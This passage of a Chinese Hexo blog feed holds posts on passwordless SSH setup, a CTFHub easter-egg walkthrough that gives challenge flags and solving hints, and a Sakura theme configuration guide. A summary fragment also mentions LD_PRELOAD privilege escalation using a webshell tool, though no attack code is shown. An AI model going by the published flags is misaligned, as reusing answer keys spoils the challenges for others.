        &lt;h1 id=&quot;LD-PRELOAD&quot;&gt;&lt;a href=&quot;#LD-PRELOAD&quot; class=&quot;headerlink&quot; title=&quot;LD_PRELOAD&quot;&gt;&lt;/a&gt;LD_PRELOAD&lt;/h1&gt;&lt;p&gt;时间紧 于是先采用最省时的方法&lt;br&gt;先蚁剑连&lt;br&gt;&lt;img src=&quot;h
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="提权" scheme="/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>终端便捷ssh（免密）连接</title>
    <link href="/2022/08/%E5%85%8D%E5%AF%86ssh%E7%99%BB%E5%BD%95/"/>
    <id>/2022/08/免密ssh登录/</id>
    <published>2022-08-29T10:18:54.812Z</published>
    <updated>2022-08-30T11:31:47.830Z</updated>
    
    <content type="html"><![CDATA[<h1 id="普通ssh方法"><a href="#普通ssh方法" class="headerlink" title="普通ssh方法"></a>普通ssh方法</h1><p>物理机ssh连接虚拟机</p><p>没基础的可以这样连：复杂</p><p><img src="https://img-blog.csdnimg.cn/322b3e519c8b4a128c24bed4da2c492b.png" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存失败,源站可能有防盗下来851229742)(C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220610164418979.png)\]"></p><p><img src="https://img-blog.csdnimg.cn/a4fbb966a75d4c8cb76f39f6ad5a6247.png" alt="在这里插入图片描述"></p><h1 id="终端快捷ssh"><a href="#终端快捷ssh" class="headerlink" title="终端快捷ssh"></a>终端快捷ssh</h1><p>复制<code>&#39;s</code>前面的<br>打开终端设置<br><img src="https://img-blog.csdnimg.cn/9fafbf4213e44ca2ac1c80a1262d9750.png" alt="在这里插入图片描述"></p><p>左侧添加新配置文件-&gt;添加新控制文件</p><p>然后填写第二行即命令行</p><pre><code class="shell">ssh 虚拟机登录用户名@虚拟机IP</code></pre><p>其实就是 ssh上面复制的</p><p>保存</p><p><img src="https://img-blog.csdnimg.cn/8240fecdcacd49d6b15ccca9c3debe88.png" alt></p><p>即可在物理机终端快速打开</p><p><img src="https://img-blog.csdnimg.cn/2314c349c1964a2d8ecf9520e7a294dd.png" alt="在这里插入图片描述"></p><h1 id="免密ssh登录"><a href="#免密ssh登录" class="headerlink" title="免密ssh登录"></a>免密ssh登录</h1><p>在物理机运行：</p><pre><code class="shell">ssh-keygen</code></pre><p>后面第一个路径回车</p><p>后面密码直接回车（即可实现免密码登录）</p><p><img src="https://img-blog.csdnimg.cn/754f8f550c2345c6a47fe8bb7c4dee29.png" alt="请添加图片描述"></p><pre><code class="shell">Your identification has been saved in C:\Users\      /.ssh/id_rsa.Your public key has been saved in C:\Users\            /.ssh/id_rsa.pub.The key fingerprint is:SHA256:ln6ZkrhHWH*********tRbGBeooF4g       \    @The key&#39;s randomart image is:+---[RSA 3072]----+|      .o.*.+     ||..   o..+ * .    ||***********.     ||   *.o.o+.o      ||. = +.o*S  .     || *********       |+----[SHA256]-----+</code></pre><p>找到第一行的那个目录，把id_rsa.pub文件复制到虚拟机</p><p>执行</p><pre><code class="shell">cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keyschmod 770 ~/.ssh/authorized_keys</code></pre><blockquote><p>报未找到.ssh的话</p><p>要先运行<code>ssh-keygen</code>和在物理机设置一样</p></blockquote><p>然后终端打开虚拟机就不用输密码了</p><h1 id="报错情况"><a href="#报错情况" class="headerlink" title="报错情况"></a>报错情况</h1><h2 id="仍需密码："><a href="#仍需密码：" class="headerlink" title="仍需密码："></a>仍需密码：</h2><p>传到虚拟机的keygen一定要是公钥pub</p><h2 id="连接超时"><a href="#连接超时" class="headerlink" title="连接超时"></a>连接超时</h2><p>过一段时间之后 连不上<br>是ip未固定<br>需将虚拟机ip固定<br>桥接和net模式固定IP方式会抽空发<br>到时候在这打个传送</p><pre><code class="shell">cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keyschmod 700 ~/.ssh/authorized_keys</code></pre><blockquote><p>报未找到.ssh的话</p><p>要先运行<code>ssh-keygen</code>和在物理机设置一样</p></blockquote><p>然后终端打开虚拟机就不用输密码了</p>]]></content>
    
    <summary type="html">
    
      终端便捷ssh（免密）连接
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="ssh" scheme="/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>ctfhub-彩蛋</title>
    <link href="/2022/08/CTFHub%E5%BD%A9%E8%9B%8B/"/>
    <id>/2022/08/CTFHub彩蛋/</id>
    <published>2022-08-28T10:40:28.395Z</published>
    <updated>2022-08-31T03:11:22.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h1><p>一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页limit都是12 但offset在变化<br>于是<br><img src="https://img-blog.csdnimg.cn/0b4b33ac483e49a9945a279bd42d7cd8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这样设置参数<br><img src="https://img-blog.csdnimg.cn/f9fc1f1792d84ca193c1ac4910dfce25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在长度为1000到6、7千左右随便一个双击后 ==点击响应== 看==响应==包<br><img src="https://img-blog.csdnimg.cn/92c81d3b913d4800a9c19030d3079d7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在最后一行</p><h1 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h1><p><a href="https://api.ctfhub.com" target="_blank" rel="noopener">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src="https://img-blog.csdnimg.cn/42334be7914f498c96d55daecf1f09fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h1><p>在web-ssrf中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838" target="_blank" rel="noopener">ctfhub-ssrf</a>post最后一行介绍</p><h1 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h1><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p><blockquote><p>彩蛋    关键词    egg    ctfhub    CTFHub    拿来把你    CTFer 自己人 ……</p></blockquote><p>到底没想到竟然是flag</p><h1 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h1><p>只找到了前半部分<br>分别在题目提交和wp提交页面的最后</p><pre><code class="css">ctfhub{029e02eb3a1    e8c49b1132b5    15b652a5f3a8    62013}</code></pre><p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢anweilx的<a href="https://www.cnblogs.com/anweilx/p/12493000.html" target="_blank" rel="noopener">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜==奖励== 在上面那行一个是base64然后再转url 一个是hex解码<br>第三行是俩页面的图片隐写 丢进winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/" target="_blank" rel="noopener">解码</a></p><h1 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h1><p>剩余皆可在对应页面搜索egg即可获得</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工具-彩蛋&quot;&gt;&lt;a href=&quot;#工具-彩蛋&quot; class=&quot;headerlink&quot; title=&quot;工具 彩蛋&quot;&gt;&lt;/a&gt;工具 彩蛋&lt;/h1&gt;&lt;p&gt;一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页&lt;br&gt;抓包后发现不管哪一页limit都是12 但offs
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="ctfhub" scheme="/tags/ctfhub/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-Theme-Sakura</title>
    <link href="/2018/12/Hexo-Theme-Sakura/"/>
    <id>/2018/12/Hexo-Theme-Sakura/</id>
    <published>2018-12-12T14:16:01.000Z</published>
    <updated>2022-08-31T03:11:37.345Z</updated>
    
    <content type="html"><![CDATA[<p>hexo-theme-sakura主题 <a href="https://github.com/honjun/hexo-theme-sakura/blob/master/README.md" target="_blank" rel="noopener">English document</a></p><p>基于WordPress主题<a href="https://github.com/mashirozx/Sakura/" target="_blank" rel="noopener">Sakura</a>修改成Hexo的主题。</p><p><a href="https://sakura.hojun.cn" target="_blank" rel="noopener">demo预览</a></p><p>正在开发中……</p><p><img src="https://wx3.sinaimg.cn/large/006bYVyvly1g069tuf42oj312w0m8ndq.jpg" alt></p><h2 id="交流群"><a href="#交流群" class="headerlink" title="交流群"></a>交流群</h2><p>若你是使用者，加群QQ: 801511924</p><p>若你是创作者，加群QQ: 194472590</p><h2 id="主题特性"><a href="#主题特性" class="headerlink" title="主题特性"></a>主题特性</h2><ul><li>首页大屏视频</li><li>首页随机封面</li><li>图片懒加载</li><li>valine评论</li><li>fancy-box相册</li><li>pjax支持，音乐不间断</li><li>aplayer音乐播放器</li><li>多级导航菜单（按现在大部分hexo主题来说，这也算是个特性了）</li></ul><h2 id="赞赏作者"><a href="#赞赏作者" class="headerlink" title="赞赏作者"></a>赞赏作者</h2><p>如果喜欢hexo-theme-sakura主题，可以考虑资助一下哦~非常感激！</p><p><a href="https://www.paypal.me/hojuncn" target="_blank" rel="noopener">paypal</a> | <a href="/img/custom/donate/AliPayQR.jpg">Alipay 支付宝</a> | <a href="/img/custom/donate/WeChanSQ.jpg">WeChat Pay 微信支付</a></p><h2 id="未完善的使用教程"><a href="#未完善的使用教程" class="headerlink" title="未完善的使用教程"></a>未完善的使用教程</h2><p>那啥？老实说我目前也不是很有条理233333333~</p><h2 id="1、主题下载安装"><a href="#1、主题下载安装" class="headerlink" title="1、主题下载安装"></a>1、主题下载安装</h2><p><a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" rel="noopener">hexo-theme-sakura</a>建议下载压缩包格式，因为除了主题内容还有些source的配置对新手来说比较太麻烦，直接下载解压就省去这些麻烦咯。</p><p>下载好后解压到博客根目录（不是主题目录哦，重复的选择替换）。接着在命令行（cmd、bash）运行<code>npm i</code>安装依赖。</p><h2 id="2、主题配置"><a href="#2、主题配置" class="headerlink" title="2、主题配置"></a>2、主题配置</h2><h3 id="博客根目录下的-config配置"><a href="#博客根目录下的-config配置" class="headerlink" title="博客根目录下的_config配置"></a>博客根目录下的_config配置</h3><p>站点</p><pre><code class="yml"># Sitetitle: 你的站点名subtitle:description: 站点简介keywords:author: 作者名language: zh-cntimezone:</code></pre><p>部署</p><pre><code class="yml">deploy:  type: git  repo:     github: 你的github仓库地址    # coding: 你的coding仓库地址  branch: master</code></pre><p>备份 （使用hexo b发布备份到远程仓库）</p><pre><code class="yml">backup:  type: git  message: backup my blog of https://honjun.github.io/  repository:    # 你的github仓库地址,备份分支名  （建议新建backup分支）    github: https://github.com/honjun/honjun.github.io.git,backup    # coding: https://git.coding.net/hojun/hojun.git,backup</code></pre><h3 id="主题目录下的-config配置"><a href="#主题目录下的-config配置" class="headerlink" title="主题目录下的_config配置"></a>主题目录下的_config配置</h3><p>其中标明【改】的是需要修改部门，标明【选】是可改可不改，标明【非】是不用改的部分</p><pre><code class="yml"># site name# 站点名 【改】prefixName: さくら荘そのsiteName: hojun# favicon and site master avatar# 站点的favicon和头像 输入图片路径（下面的配置是都是cdn的相对路径，没有cdn请填写完整路径，建议使用jsdeliver搭建一个cdn啦，先去下载我的cdn替换下图片就行了，简单方便~）【改】favicon: /images/favicon.icoavatar: /img/custom/avatar.jpg# 站点url 【改】url: https://sakura.hojun.cn# 站点介绍（或者说是个人签名）【改】description: Live your life with passion! With some drive!# 站点cdn，没有就为空 【改】  若是cdn为空，一些图片地址就要填完整地址了，比如之前avatar就要填/img/custom/avatar.jpgcdn: # 开启pjax 【选】pjax: 1# 站点首页的公告信息 【改】notice: hexo-Sakura主题已经开源，目前正在开发中...# 懒加载的加载中图片 【选】lazyloadImg: /img/loader/orange.progress-bar-stripe-loader.svg# 站点菜单配置 【选】menus:  首页: { path: /, fa: fa-fort-awesome faa-shake }  归档: { path: /archives, fa: fa-archive faa-shake, submenus: {     技术: {path: /categories/技术/, fa: fa-code },     生活: {path: /categories/生活/, fa: fa-file-text-o },     资源: {path: /categories/资源/, fa: fa-cloud-download },     随想: {path: /categories/随想/, fa: fa-commenting-o },    转载: {path: /categories/转载/, fa: fa-book }  } }  清单: { path: javascript:;, fa: fa-list-ul faa-vertical, submenus: {     书单: {path: /tags/悦读/, fa: fa-th-list faa-bounce },     番组: {path: /bangumi/, fa: fa-film faa-vertical },     歌单: {path: /music/, fa: fa-headphones },    图集: {path: /tags/图集/, fa: fa-photo }  } }  留言板: { path: /comment/, fa: fa-pencil-square-o faa-tada }  友人帐: { path: /links/, fa: fa-link faa-shake }  赞赏: { path: /donate/, fa: fa-heart faa-pulse }  关于: { path: /, fa: fa-leaf faa-wrench , submenus: {     我？: {path: /about/, fa: fa-meetup},     主题: {path: /theme-sakura/, fa: iconfont icon-sakura },    Lab: {path: /lab/, fa: fa-cogs },  } }  客户端: { path: /client/, fa: fa-android faa-vertical }  RSS: { path: /atom.xml, fa: fa-rss faa-pulse }# Home page sort type: -1: newer first，1: older first. 【非】homePageSortType: -1# Home page article shown number) 【非】homeArticleShown: 10# 背景图片 【选】bgn: 8# startdash面板 url, title, desc img 【改】startdash:   - {url: /theme-sakura/, title: Sakura, desc: 本站 hexo 主题, img: /img/startdash/sakura.md.png}  - {url: http://space.bilibili.com/271849279, title: Bilibili, desc: 博主的b站视频, img: /img/startdash/bilibili.jpg}  - {url: /, title: hojun的万事屋, desc: 技术服务, img: /img/startdash/wangshiwu.jpg}# your site build time or founded date# 你的站点建立日期 【改】siteBuildingTime: 07/17/2018# 社交按钮(social)  url, img PC端配置 【改】social:  github: {url: http://github.com/honjun, img: /img/social/github.png}  sina: {url: http://weibo.com/mashirozx?is_all=1, img: /img/social/sina.png}  wangyiyun: {url: http://weibo.com/mashirozx?is_all=1, img: /img/social/wangyiyun.png}  zhihu: {url: http://weibo.com/mashirozx?is_all=1, img: /img/social/zhihu.png}  email: {url: http://weibo.com/mashirozx?is_all=1, img: /img/social/email.svg}  wechat: {url: /#, qrcode: /img/custom/wechat.jpg, img: /img/social/wechat.png}# 社交按钮(msocial)  url, img 移动端配置 【改】msocial:  github: {url: http://github.com/honjun, fa: fa-github, color: 333}  weibo: {url: http://weibo.com/mashirozx?is_all=1, fa: fa-weibo, color: dd4b39}  qq: {url: https://wpa.qq.com/msgrd?v=3&amp;uin=954655431&amp;site=qq&amp;menu=yes, fa: fa-qq, color: 25c6fe}# 赞赏二维码（其中wechatSQ是赞赏单页面的赞赏码图片）【改】donate:  alipay: /img/custom/donate/AliPayQR.jpg  wechat: /img/custom/donate/WeChanQR.jpg  wechatSQ: /img/custom/donate/WeChanSQ.jpg# 首页视频地址为https://cdn.jsdelivr.net/gh/honjun/hojun@1.2/Unbroken.mp4，配置如下 【改】movies:  url: https://cdn.jsdelivr.net/gh/honjun/hojun@1.2  # 多个视频用逗号隔开，随机获取。支持的格式目前已知MP4,Flv。其他的可以试下，不保证有用  name: Unbroken.mp4# 左下角aplayer播放器配置 主要改id和server这两项，修改详见[aplayer文档] 【改】aplayer:   id: 2660651585  server: netease  type: playlist  fixed: true  mini: false  autoplay: false  loop: all  order: random  preload: auto  volume: 0.7  mutex: true# Valine评论配置【改】valine: truev_appId: GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHszv_appKey: mgOpfzbkHYqU92CV4IDlAUHQ</code></pre><h2 id="分类页和标签页配置"><a href="#分类页和标签页配置" class="headerlink" title="分类页和标签页配置"></a>分类页和标签页配置</h2><h3 id="分类页"><a href="#分类页" class="headerlink" title="分类页"></a>分类页</h3><p><img src="https://ws3.sinaimg.cn/large/006bYVyvly1g07b0gucy9j31060jih76.jpg" alt></p><h3 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h3><p><img src="https://wx2.sinaimg.cn/large/006bYVyvly1g07azb2399j31040jgazs.jpg" alt></p><p>配置项在\themes\Sakura\languages\zh-cn.yml里。新增一个分类或标签最好加下哦，当然嫌麻烦可以直接使用一张默认图片（可以改主题或者直接把404图片替换下，征求下意见要不要给这个在配置文件中加个开关，可以issue或群里提出来），现在是没设置的话会使用那种倒立小狗404哦。</p><pre><code class="yml">#category# 按分类名创建技术:    #中文标题    zh: 野生技术协会     # 英文标题    en: Geek – Only for Love    # 封面图片    img: /img/banner/coding.jpg生活:    zh: 生活    en: live    img: /img/banner/writing.jpg#tag# 标签名即是标题悦读:    # 封面图片    img: /img/banner/reading.jpg</code></pre><h2 id="单页面封面配置"><a href="#单页面封面配置" class="headerlink" title="单页面封面配置"></a>单页面封面配置</h2><p><img src="https://ws3.sinaimg.cn/large/006bYVyvly1g07b1pi619j31080jge4u.jpg" alt><br>如留言板页面页面，位于source下的comment下，打开index.md如下：</p><pre><code class="md">---title: commentdate: 2018-12-20 23:13:48keywords: 留言板description: comments: true# 在这里配置单页面头部图片，自定义替换哦~photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/comment.jpg---</code></pre><h2 id="单页面配置"><a href="#单页面配置" class="headerlink" title="单页面配置"></a>单页面配置</h2><h3 id="番组计划页-（请直接在下载后的文件中改，下面的添加了注释可能会有些影响）"><a href="#番组计划页-（请直接在下载后的文件中改，下面的添加了注释可能会有些影响）" class="headerlink" title="番组计划页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响）"></a>番组计划页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响）</h3><p><img src="https://wx2.sinaimg.cn/large/006bYVyvly1g07b2gyx60j31090jjahj.jpg" alt></p><pre><code class="yml">---layout: bangumititle: bangumicomments: falsedate: 2019-02-10 21:32:48keywords:description:bangumis:  # 番组图片  - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg  # 番组名    title: 朝花夕誓——于离别之朝束起约定之花  # 追番状态 （追番ing/已追完）    status: 已追完  # 追番进度    progress: 100  # 番剧日文名称    jp: さよならの朝に約束の花をかざろう  # 放送时间    time: 放送时间: 2018-02-24 SUN.  # 番剧介绍    desc:  住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。  - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg    title: 朝花夕誓——于离别之朝束起约定之花    status: 已追完    progress: 50    jp: さよならの朝に約束の花をかざろう    time: 放送时间: 2018-02-24 SUN.    desc: 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。---</code></pre><h3 id="友链页-（请直接在下载后的文件中改，下面的添加了注释可能会有些影响）"><a href="#友链页-（请直接在下载后的文件中改，下面的添加了注释可能会有些影响）" class="headerlink" title="友链页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响）"></a>友链页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响）</h3><p><img src="https://ws3.sinaimg.cn/large/006bYVyvly1g07b39tleej31080jhjv1.jpg" alt></p><pre><code class="yml">---layout: linkstitle: links# 创建日期，可以改下date: 2018-12-19 23:11:06 # 图片上的标题，自定义修改keywords: 友人帐 description: # true/false 开启/关闭评论comments: true # 页面头部图片，自定义修改photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/links.jpg # 友链配置links:   # 类型分组  - group: 个人项目    # 类型简介    desc: 充分说明这家伙是条咸鱼 &lt; (￣︶￣)&gt;    items:    # 友链链接    - url: https://shino.cc/fgvf    # 友链头像      img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg    # 友链站点名      name: Google    # 友链介绍  下面雷同      desc: Google 镜像    - url: https://shino.cc/fgvf      img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg      name: Google      desc: Google 镜像  # 类型分组...  - group: 小伙伴们    desc: 欢迎交换友链 ꉂ(ˊᗜˋ)    items:    - url: https://shino.cc/fgvf      img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg      name: Google      desc: Google 镜像    - url: https://shino.cc/fgvf      img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg      name: Google      desc: Google 镜像---</code></pre><h2 id="写文章配置"><a href="#写文章配置" class="headerlink" title="写文章配置"></a>写文章配置</h2><p>主题集成了个人插件hexo-tag-bili和hexo-tag-fancybox_img。其中hexo-tag-bili用来在文章或单页面中插入B站外链视频，使用语法如下：</p><pre><code class="md">{% bili video_id [page] %}</code></pre><p>详细使用教程详见<a href="https://github.com/honjun/hexo-tag-bili/blob/master/README-zh_cn.md" target="_blank" rel="noopener">hexo-tag-bili</a>。</p><p>hexo-tag-fancybox_img用来在文章或单页面中图片，使用语法如下：</p><pre><code class="md">{% fb_img src [caption] %}</code></pre><p>详细使用教程详见<a href="https://github.com/honjun/hexo-tag-fancybox_img/blob/master/README-zh_cn.md" target="_blank" rel="noopener">hexo-tag-fancybox_img</a></p><h2 id="还有啥，一时想不起来……"><a href="#还有啥，一时想不起来……" class="headerlink" title="还有啥，一时想不起来……"></a>还有啥，一时想不起来……</h2><p>To be continued…</p>]]></content>
    
    <summary type="html">
    
      hexo-sakura主题使用教程
    
    </summary>
    
      <category term="技术" scheme="/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="悦读" scheme="/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
</feed>
